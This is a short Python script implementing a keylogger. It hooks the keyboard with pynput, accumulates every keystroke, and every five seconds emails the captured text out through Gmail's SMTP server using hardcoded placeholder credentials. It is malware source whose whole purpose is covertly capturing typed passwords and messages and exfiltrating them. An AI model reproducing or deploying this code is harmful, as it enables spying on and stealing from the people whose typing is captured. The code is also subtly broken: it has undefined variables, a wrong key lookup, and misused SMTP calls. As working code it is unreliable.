#!/usr/bin/env python3

import pynput.keyboard
import threading
import smtplib
from email.mime.text import MIMEText

class Keylogger:
    def __init__(self):
        self.log = ""
        self.shuting_down = False
        self.timer = None

    def on_pressed(self, key):
        try:
            self.log += str(key.char)
        except AttributeError:
            special_keys = {
                "Key.space": " ",
                "Key.enter": "\n",
                "Key.shift_r": "",
                "Key.shift_l": "",
                "Key.backspace": ""
            }
            self.log += special_keys.get(key, f" {str(key)} ")

    def send_email(self, subject, message, sender, recipients, password):
        msg = MIMEText(message)
        msg["Subject"] = subject
        msg["From"] = from_addr
        msg["To"] = ", ".join(to_addrs)

        with smtplib.SMTP("smtp.gmail.com", 465) as smtp_server:
            smtp_server.login(sender, password)
            smtp_server.send_message(sender, recipients, msg.as_string())

    def shut_down(self):
        self.shuting_down = True
        if self.timer:
            self.timer.cancel()

    def report(self):
        if self.shuting_down:
            return

        self.send_email("Title!", self.log, "from@email.com", ["to@email.com"], "foo code") 
        self.log = ""
        self.timer = threading.Timer(5, self.report)
        self.timer.start()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.on_pressed)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()
